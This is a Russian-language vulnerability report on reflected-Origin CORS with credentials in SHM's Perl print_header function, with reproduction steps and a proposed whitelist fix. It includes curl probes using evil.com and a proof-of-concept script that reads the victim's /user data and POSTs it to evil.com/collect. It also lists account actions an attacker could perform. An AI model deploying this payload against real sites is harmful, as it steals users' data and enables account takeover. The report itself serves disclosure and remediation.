# CORS: отражение произвольного Origin с Credentials

## Суть

SHM отражает любой `Origin` заголовок из запроса обратно в `Access-Control-Allow-Origin` и при этом устанавливает `Access-Control-Allow-Credentials: true`. Это позволяет любому вредоносному сайту выполнять авторизованные запросы к SHM API от имени залогиненного пользователя.

## Где проблема

Файл `app/lib/Core/Utils.pm`, функция `print_header`:

```perl
'Access-Control-Allow-Origin' => "$ENV{HTTP_ORIGIN}",
'Access-Control-Allow-Credentials' => 'true',
```

`$ENV{HTTP_ORIGIN}` — это заголовок `Origin` из входящего HTTP-запроса. Браузер отправляет его автоматически. Сервер отражает его без проверки.

## Как воспроизвести

### Шаг 1. Проверить отражение Origin

```bash
curl -s -D- -H "Origin: https://evil.com" "https://YOUR-SHM/shm/v1/test" | head -10
```

В ответе будут заголовки:
```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

### Шаг 2. Проверить с любым другим доменом

```bash
curl -s -D- -H "Origin: https://attacker-site.ru" "https://YOUR-SHM/shm/v1/test" | head -10
```

Результат тот же — любой Origin отражается.

### Шаг 3. Proof of Concept — кража данных через вредоносный сайт

Атакующий размещает на своём сайте `https://evil.com/steal.html`:

```html
<script>
fetch('https://YOUR-SHM/shm/v1/user', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  // Отправляем данные жертвы на сервер атакующего
  fetch('https://evil.com/collect', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
```

Если пользователь SHM откроет эту страницу (ссылка в письме, мессенджере, на форуме):
1. Браузер отправляет запрос к SHM API с cookies/session пользователя
2. SHM отвечает с `Access-Control-Allow-Origin: https://evil.com` + `Credentials: true`
3. Браузер разрешает JavaScript прочитать ответ
4. Данные пользователя (баланс, услуги, настройки) утекают атакующему

## Что может сделать атакующий

Через вредоносную страницу — **все действия от имени жертвы**:

- `GET /user` — прочитать профиль, баланс, логин
- `GET /user/service` — список услуг и их настройки
- `POST /user` — изменить данные профиля
- `PUT /storage/manage/*` — записать данные в storage
- `DELETE /storage/manage/*` — удалить данные из storage
- `POST /user/passwd` — сменить пароль (если не требуется старый)

Фактически это **полный CSRF с чтением ответа** — атакующий и читает, и пишет.

## Кто может эксплуатировать

Любой. Достаточно отправить жертве ссылку на вредоносную страницу. Жертва не вводит никаких данных — просто открывает страницу.

## Предложенный фикс

В файле `app/lib/Core/Utils.pm`, в функции `print_header`, заменить отражение Origin на whitelist:

```perl
# Было:
'Access-Control-Allow-Origin' => "$ENV{HTTP_ORIGIN}",
'Access-Control-Allow-Credentials' => 'true',

# Стало:
my $origin = $ENV{HTTP_ORIGIN} // '';
my $allowed_origins = get_service('config')->get_data->{cors}->{allowed_origins} || [];
my $cors_origin = '';
for my $allowed (@$allowed_origins) {
    if ($origin eq $allowed) {
        $cors_origin = $origin;
        last;
    }
}
...
'Access-Control-Allow-Origin' => $cors_origin,
'Access-Control-Allow-Credentials' => $cors_origin ? 'true' : 'false',
```

И добавить в конфиг список разрешённых origins:
```json
{
  "cors": {
    "allowed_origins": [
      "https://admin.yourdomain.com",
      "https://client.yourdomain.com"
    ]
  }
}
```

Минимальный фикс (без конфига) — хотя бы не отражать Origin если его нет в захардкоженном списке:

```perl
my %allowed = map { $_ => 1 } qw(
    https://admin.yourdomain.com
    https://client.yourdomain.com
);
my $origin = $ENV{HTTP_ORIGIN} // '';
'Access-Control-Allow-Origin' => ($allowed{$origin} ? $origin : ''),
'Access-Control-Allow-Credentials' => ($allowed{$origin} ? 'true' : 'false'),
```

## Severity

**CRITICAL** — полный доступ к аккаунту любого пользователя без его ведома. Достаточно одного клика по ссылке.

## Затронутые версии

Проверено на 2.7.2. Уязвимость присутствует во всех версиях где Origin отражается без валидации.

## Связанные проблемы

- Сессии передаются через заголовок `session-id` (не HttpOnly cookie), поэтому JavaScript на вредоносной странице может перехватить session_id из ответа API и использовать его напрямую.
- Отсутствие SameSite cookie атрибута усиливает проблему.
